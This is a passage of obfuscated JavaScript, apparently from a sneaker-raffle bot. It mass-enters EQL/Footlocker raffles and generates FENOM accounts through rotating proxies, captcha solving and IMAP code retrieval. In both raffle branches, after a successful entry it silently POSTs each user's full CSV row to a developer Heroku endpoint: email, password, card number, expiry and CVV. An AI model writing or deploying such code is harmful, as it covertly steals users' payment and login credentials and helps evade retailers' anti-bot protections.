                            try {
                                await _0x5e4531['waitForSelector']('#stateAutocomplete');
                            } catch {
                                throw new Error('Connection\x20Error\x20fetching\x20shipping');
                            }
                            await _0xf987cc(0x1f4), await _0xf987cc(0x5dc);
                            if (!_0x427c24['includes']('footlocker'))
                                try {
                                    await _0x5e4531['click']('#country');
                                    const _0x146f0b = await _0x5e4531['$']('li[data-value=\x22' + _0x2e4100[_0x367e9d]['Country'] + '\x22]');
                                    await _0x146f0b['click'](), await _0x146f0b['click']();
                                } catch {
                                    throw new Error('Country.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            await _0xf987cc(0x3e8), await _0x5e4531['click']('#stateAutocomplete'), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Setting\x20Address'), await _0xf987cc(0x1f4);
                            try {
                                const _0x434421 = await _0x5e4531['$x']('//li[text()=\x22' + _0x2e4100[_0x367e9d]['State'] + '\x22]');
                                await _0x434421[0x0]['click']();
                            } catch {
                                throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                            }
                            await _0xf987cc(0x3e8), await _0xf987cc(0x1f4), await _0x5e4531['type']('#address1', _0x2e4100[_0x367e9d]['Address1'] + '\x20' + _0x2e4100[_0x367e9d]['HouseNumber']), await _0xf987cc(0x1f4), await _0x5e4531['type']('#address2', '' + _0x2e4100[_0x367e9d]['Address2']), await _0xf987cc(0x1f4), await _0x5e4531['type']('#city', '' + _0x2e4100[_0x367e9d]['City']), await _0xf987cc(0x1f4), await _0x5e4531['type']('#postcode', '' + _0x2e4100[_0x367e9d]['Zip']), await _0xf987cc(0x3e8), await _0x5e4531['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf987cc(0x3e8), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0x4de864 = await _0x5e4531['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4de864 && (await _0x5e4531['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5e4531['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x5e4531['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf987cc(0x4b0), await _0x5e4531['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf987cc(0x1f4), await _0x5e4531['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CardNumber']), await _0xf987cc(0x320), await _0x5e4531['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5e4531['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x5e4531['keyboard']['type']('' + _0x2e4100[_0x367e9d]['ExpiryDate']), await _0xf987cc(0x4b0), await _0x5e4531['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5e4531['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x5e4531['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CVV']), await _0xf987cc(0x226), await _0x5e4531['type']('input[name=\x22postalCode\x22]', '' + _0x2e4100[_0x367e9d]['Zip']), await _0xf987cc(0x226));
                            const _0x1c0eb6 = await _0x5e4531['$']('.__PrivateStripeElement');
                            _0x1c0eb6 && (await _0xf987cc(0x1f4), await _0x5e4531['click']('.__PrivateStripeElement'), await _0x5e4531['click']('.__PrivateStripeElement'), await _0x5e4531['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CardNumber']), await _0x5e4531['keyboard']['type']('' + _0x2e4100[_0x367e9d]['ExpiryDate']), await _0x5e4531['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CVV']));
                            await _0xf987cc(0x226), await _0x5e4531['click']('#paymentConsent'), await _0xf987cc(0x226), await _0x5e4531['click']('#termsConsent'), await _0xf987cc(0x2bc), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x5e4531['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf987cc(0x2710);
                            try {
                                await _0x5e4531['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0xf987cc(0xbb8), await _0x5e4531['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x57fecf => _0x57fecf['click']()), await _0x5e4531['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x1c1fcb => _0x1c1fcb['click']());
                            } catch {
                            }
                            try {
                                await _0x5e4531['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x55e819 = await _0x5e4531['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x55e819) {
                                    _0x3f8380['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2e4100[_0x367e9d]['Email'] + ',' + _0x2e4100[_0x367e9d]['Password'] + ',' + _0x2e4100[_0x367e9d]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0x2c4d1c() {
                                var _0x1e9bce, _0x5e5c12 = ![];
                                for (var _0x46b283 = 0x0; _0x46b283 < 0x18; _0x46b283++) {
                                    async function _0x193f05() {
                                        var _0x51819e = new _0x2a51ab({
                                            'user': _0x51f80a['masterMail'],
                                            'password': _0x51f80a['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x410bf5(_0x496a30) {
                                            _0x51819e['openBox']('INBOX', ![], _0x496a30);
                                        }
                                        _0x51819e['once']('ready', function () {
                                            console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x410bf5(function (_0x42be12, _0x3b9458) {
                                                console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x42be12)
                                                    throw _0x42be12;
                                                _0x51819e['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x306f8b, _0x42f5a) {
                                                    if (!_0x42f5a || !_0x42f5a['length'])
                                                        console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x51819e['end']();
                                                    else {
                                                        var _0x1f0b1c = _0x51819e['seq']['fetch'](_0x42f5a, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x1f0b1c['on']('message', function (_0x2416c5, _0x18fd86) {
                                                            var _0x2fa72d = '(#' + _0x18fd86 + ')\x20';
                                                            _0x2416c5['on']('body', function (_0x146548, _0x3a7251) {
                                                                _0xfebb(_0x146548, (_0x5d7331, _0x8ac6a8) => {
                                                                    if (_0x8ac6a8['subject']['includes']('code')) {
                                                                        const _0x8093e5 = _0x8ac6a8['text']['split']('\x0a\x0a')[0x3], _0x433ee9 = _0x8093e5['split']('\x0a')[0x1];
                                                                        _0x1e9bce = _0x433ee9;
                                                                    }
                                                                });
                                                            }), _0x2416c5['once']('end', function () {
                                                            });
                                                        }), _0x1f0b1c['once']('error', function (_0x4807df) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x1f0b1c['once']('end', function () {
                                                            _0x51819e['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x51819e['once']('error', function (_0x1b147d) {
                                            console['log'](_0x2c0b56['red'](_0x1b147d['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x5e5c12 = !![];
                                        }), _0x51819e['once']('end', async function () {
                                        }), _0x51819e['connect']();
                                    }
                                    _0x193f05(), await _0xf987cc(0x1388);
                                    if (_0x1e9bce)
                                        return _0x1e9bce;
                                    if (_0x5e5c12)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x46b283 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0x2c4d1c(), await _0xf987cc(0x1f4), await _0x5e4531['type']('#code', '' + code), await _0xf987cc(0x3e8), await _0x5e4531['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x17ccc4 => _0x17ccc4['click']()), await _0x5e4531['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x5e4531['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x2e4100[_0x367e9d]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x3f8380['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2e4100[_0x367e9d]['Email'] + ',' + _0x2e4100[_0x367e9d]['Password'] + ',' + _0x2e4100[_0x367e9d]['Phone']), _0x19b757 = 'no', _0x46ba09(_0x2e4100[_0x367e9d], _0x51a5e1);
                            var _0x3b41ca = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'dev', ![]), _0x31ae70 = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'pub', ![]);
                            let _0x566335 = _0x2e4100[_0x367e9d];
                            try {
                                prxdata = {
                                    'username': _0x5ad930['replace']('#', ''),
                                    'module': _0x51a5e1['name'],
                                    'entrydata': JSON['stringify'](_0x566335),
                                    'proxy': '' + _0x1489e3[_0x367e9d]
                                };
                                var _0x213644 = JSON['stringify'](prxdata);
                                let _0x4949df = { 'headers': { 'content-type': 'application/json' } };
                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x213644, _0x4949df);
                            } catch (_0x2ebee4) {
                            }
                            const _0x2ec66e = {
                                'succesDEVMSG': { 'embeds': [_0x3b41ca] },
                                'succesPUBMSG': { 'embeds': [_0x31ae70] }
                            };
                            try {
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x2ec66e['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x2ec66e['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x2ec66e['succesPUBMSG']);
                            } catch (_0xe805e0) {
                                console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0xe805e0));
                            }
                        } catch (_0x44bb31) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20' + _0x44bb31)), _0x5447bb = '' + _0x44bb31;
                            var _0x2d5abd = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'dev', !![], _0x5447bb), _0x3b41ca = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'dev', ![]), _0x31ae70 = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'pub', ![]);
                            const _0x219867 = {
                                'succesDEVMSG': { 'embeds': [_0x3b41ca] },
                                'succesPUBMSG': { 'embeds': [_0x31ae70] }
                            };
                            _0x219867['errorDEV'] = { 'embeds': [_0x2d5abd] };
                            _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x219867['errorDEV']);
                            await _0x215470(_0x1dec8a, _0x219867['errorDEV']);
                            if (!_0x19b757 == 'no')
                                _0x19b757 = 'yes';
                        } finally {
                            _0x4b5c19 && _0x4b5c19['close']();
                            if (_0x19b757 == 'yes' && _0x255e03 != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Retrying\x20(' + _0x255e03 + '\x20/\x205)')), _0x367e9d = _0x367e9d - 0x1, _0x255e03 = _0x255e03 + 0x1;
                                continue;
                            }
                            _0x19b757 == 'yes' && _0x255e03 >= 0x5 && (_0x46ac44(_0x2e4100[_0x367e9d], _0x51a5e1), _0x19b757 = 'no', _0x255e03 = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    } else {
                        const _0x5a8b34 = '' + _0x2e4100[_0x367e9d]['Url'];
                        if (_0x19b757 != 'yes')
                            var _0x19b757 = '', _0x255e03 = 0x0;
                        if (_0x2e4100[_0x367e9d]['Email'] == '' || _0x2e4100[_0x367e9d]['FirstName'] == '' || _0x2e4100[_0x367e9d]['LastName'] == '') {
                            console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2e4100[_0x367e9d]['Password'] == '' && (_0x2e4100[_0x367e9d]['Password'] = 'JRaffles23!');
                        if (_0x51f80a['useRandomProxy'] = ![])
                            var _0x580bd0 = _0x1489e3[_0x367e9d]['split'](':');
                        else
                            var _0x881c94 = Math['round'](Math['random']() * (_0x1489e3['length'] - 0x1)), _0x580bd0 = _0x1489e3[_0x881c94]['split'](':');
                        var _0x4b5c19;
                        try {
                            _0x4b5c19 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x580bd0[0x0] + ':' + _0x580bd0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x4b5c19 = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x580bd0[0x0] + ':' + _0x580bd0[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2b680c = await _0x4b5c19['newPage']();
                            await _0x2b680c['authenticate']({
                                'username': '' + _0x580bd0[0x2],
                                'password': '' + _0x580bd0[0x3]
                            }), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2b680c['setRequestInterception'](!![]), _0x2b680c['on']('request', _0x330d0a => {
                                _0x330d0a['resourceType']() === 'image' || _0x330d0a['resourceType']() === 'font' || _0x330d0a['resourceType']() === 'media' ? _0x330d0a['abort']() : _0x330d0a['continue']();
                            }), await _0x2b680c['goto'](_0x5a8b34), await _0x2b680c['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2b680c['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0xf987cc(0x7d0), await _0x2b680c['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2b680c['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0xf987cc(0x3e8), await _0x2b680c['waitForSelector']('#email'), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2b680c['type']('#email', '' + _0x2e4100[_0x367e9d]['Email']), await _0xf987cc(0x352), await _0x2b680c['waitForSelector']('#password'), await _0x2b680c['type']('#password', '' + _0x2e4100[_0x367e9d]['Password']), await _0xf987cc(0x352), await _0x2b680c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf987cc(0x1388);
                            if (!_0x2e4100[_0x367e9d]['Url']['includes']('footlocker'))
                                await _0x2b680c['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x2b680c['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x46ba09(_0x2e4100[_0x367e9d], _0x51a5e1), _0x19b757 = 'no';
                                continue;
                            }
                            await _0x2b680c['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0xf987cc(0x3e8);
                            try {
                                _0x2e4100[_0x367e9d]['Url']['includes']('en-GB') ? await _0x2b680c['click']('li[data-value=\x22UK\x20' + _0x2e4100[_0x367e9d]['Size'] + '\x20/\x20US\x20' + (Number(_0x2e4100[_0x367e9d]['Size']) + 0x1) + '\x22]') : await _0x2b680c['click']('li[data-value=\x22EU\x20' + _0x2e4100[_0x367e9d]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x2e4100[_0x367e9d]['Size']);
                            }
                            await _0xf987cc(0x1f4);
                            const _0x48f0c8 = await _0x2b680c['$']('#title\x20>\x20label');
                            await _0xf987cc(0x12c);
                            _0x48f0c8 && await _0x48f0c8['click']();
                            await _0x2b680c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2b680c['focus']('#postcode'), await _0x2b680c['keyboard']['down']('Control'), await _0x2b680c['keyboard']['press']('A'), await _0x2b680c['keyboard']['up']('Control'), await _0x2b680c['keyboard']['press']('Backspace'), await _0x2b680c['keyboard']['type'](_0x2e4100[_0x367e9d]['Zip']), await _0xf987cc(0x60e), await _0x2b680c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf987cc(0x3e8), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0xf987cc(0x1f4);
                            const _0x23eb15 = await _0x2b680c['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x23eb15 && (await _0x2b680c['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2b680c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2b680c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf987cc(0x4b0), await _0x2b680c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0xf987cc(0x1f4), await _0x2b680c['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CardNumber']), await _0xf987cc(0x320), await _0x2b680c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2b680c['keyboard']['type']('' + _0x2e4100[_0x367e9d]['ExpiryDate']), await _0xf987cc(0x4b0), await _0x2b680c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2b680c['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CVV']), await _0xf987cc(0x226), await _0x2b680c['type']('input[name=\x22postalCode\x22]', '' + _0x2e4100[_0x367e9d]['Zip']), await _0xf987cc(0x226));
                            const _0x5a126d = await _0x2b680c['$']('.__PrivateStripeElement');
                            _0x5a126d && (await _0x2b680c['click']('#billingName'), await _0x2b680c['click']('#billingName'), await _0x2b680c['type']('#billingName', '' + _0x2e4100[_0x367e9d]['NameOnCard']), await _0xf987cc(0x1f4), await _0x2b680c['click']('.__PrivateStripeElement'), await _0x2b680c['click']('.__PrivateStripeElement'), await _0x2b680c['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CardNumber']), await _0x2b680c['keyboard']['type']('' + _0x2e4100[_0x367e9d]['ExpiryDate']), await _0x2b680c['keyboard']['type']('' + _0x2e4100[_0x367e9d]['CVV']));
                            await _0xf987cc(0x226), await _0x2b680c['click']('#paymentConsent'), await _0xf987cc(0x226), await _0x2b680c['click']('#termsConsent'), await _0xf987cc(0x2bc), console['log'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2b680c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0xf987cc(0x2710);
                            try {
                                await _0x2b680c['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0xf987cc(0xbb8), await _0x2b680c['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x48b2b5 => _0x48b2b5['click']()), await _0x2b680c['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x57ff63 => _0x57ff63['click']());
                            } catch {
                            }
                            try {
                                await _0x2b680c['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x2c0b56['green'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x46ba09(_0x2e4100[_0x367e9d], _0x51a5e1);
                            var _0x3b41ca = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'dev', ![]), _0x31ae70 = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'pub', ![]);
                            let _0x1be9a6 = _0x2e4100[_0x367e9d];
                            try {
                                prxdata = {
                                    'username': _0x5ad930['replace']('#', ''),
                                    'module': _0x51a5e1['name'],
                                    'entrydata': JSON['stringify'](_0x1be9a6),
                                    'proxy': '' + _0x1489e3[_0x367e9d]
                                };
                                var _0x213644 = JSON['stringify'](prxdata);
                                let _0x53cabd = { 'headers': { 'content-type': 'application/json' } };
                                await _0x529551['post']('https://jraffles.herokuapp.com/success', _0x213644, _0x53cabd);
                            } catch (_0x291116) {
                            }
                            const _0x111a62 = {
                                'succesDEVMSG': { 'embeds': [_0x3b41ca] },
                                'succesPUBMSG': { 'embeds': [_0x31ae70] }
                            };
                            try {
                                _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x111a62['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x43acb0, _0x111a62['succesDEVMSG']), await _0xf987cc(0xc8), await _0x215470(_0x255a14, _0x111a62['succesPUBMSG']);
                            } catch (_0x323cc4) {
                                console['log'](_0x2c0b56['yellow'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x323cc4));
                            }
                            _0x19b757 = 'no';
                        } catch (_0x3d37cc) {
                            console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20' + _0x3d37cc)), _0x5447bb = '' + _0x3d37cc;
                            var _0x2d5abd = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'dev', !![], _0x5447bb), _0x3b41ca = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'dev', ![]), _0x31ae70 = await _0x539676(_0x2e4100[_0x367e9d], _0x51a5e1, 'pub', ![]);
                            const _0x247b61 = {
                                'succesDEVMSG': { 'embeds': [_0x3b41ca] },
                                'succesPUBMSG': { 'embeds': [_0x31ae70] }
                            };
                            _0x247b61['errorDEV'] = { 'embeds': [_0x2d5abd] }, _0x51f80a['webhook'] != undefined && _0x51f80a['webhook'] != '' && await _0x215470(_0x51f80a['webhook'], _0x247b61['errorDEV']), await _0x215470(_0x1dec8a, _0x247b61['errorDEV']), _0x19b757 = 'yes';
                        } finally {
                            _0x4b5c19 && _0x4b5c19['close']();
                            if (_0x19b757 == 'yes' && _0x255e03 != 0x5) {
                                console['log'](_0x2c0b56['red'](_0x5c3ac1() + '\x20[' + _0x51a5e1['name'] + ']\x20Task\x20' + (_0x367e9d + 0x1) + '\x20:\x20Retrying\x20(' + _0x255e03 + '\x20/\x205)')), _0x367e9d = _0x367e9d - 0x1, _0x255e03 = _0x255e03 + 0x1;
                                continue;
                            }
                            _0x19b757 == 'yes' && _0x255e03 >= 0x5 && (_0x46ac44(_0x2e4100[_0x367e9d], _0x51a5e1), _0x19b757 = 'no', _0x255e03 = 0x0), console['log']('Waiting\x20for\x20' + _0x51f80a['delay'] + '\x20ms'), await _0xf987cc(_0x51f80a['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0xca01b4, _0x56f896, _0x56a065) {
                    _0x39c115['use'](_0x5cc924()), _0x39c115['use'](_0x63578e({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x51f80a['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0xc596a5 = 0x0; _0xc596a5 < _0x56f896['length']; _0xc596a5++) {
                        if (_0x5b1ce1 != 'yes')
                            var _0x5b1ce1 = '', _0x1c7809 = 0x0;
                        var _0x3ec3f9;
                        try {
                            await _0x3d5d40(_0x56f896, _0xc596a5);
                        } catch {
                            _0x5b1ce1 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x5c316f(_0xca01b4['name'] + '\x20Task\x20' + (_0xc596a5 + 0x1) + '\x20/\x20' + _0x56f896['length'] + '\x20||\x20File:\x20' + _0x49db92 + '\x20Proxies:\x20' + _0x33a3cd);
                        var _0x10610b = await _0x539676(_0x56f896[_0xc596a5], _0xca01b4, 'acc', ![]);
                        const _0xc8e3d1 = { 'succesDEVMSG': { 'embeds': [_0x10610b] } }, _0x3a7d87 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x4f4ea1 = Math['round'](Math['random']() * (_0x56a065['length'] - 0x1)), _0x27111a = _0x56a065[_0x4f4ea1]['split'](':'), _0x1581ac;
                        try {
                            _0x1581ac = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x27111a[0x0] + ':' + _0x27111a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x1581ac = await _0x39c115['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x27111a[0x0] + ':' + _0x27111a[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x5e121b = await _0x1581ac['newPage']();
                            await _0x5e121b['setViewport']({
                                'width': 0x500 + _0x5ab5b3(0x1, 0x32),
                                'height': 0x2d9 + _0x5ab5b3(0x1, 0x32)
                            });
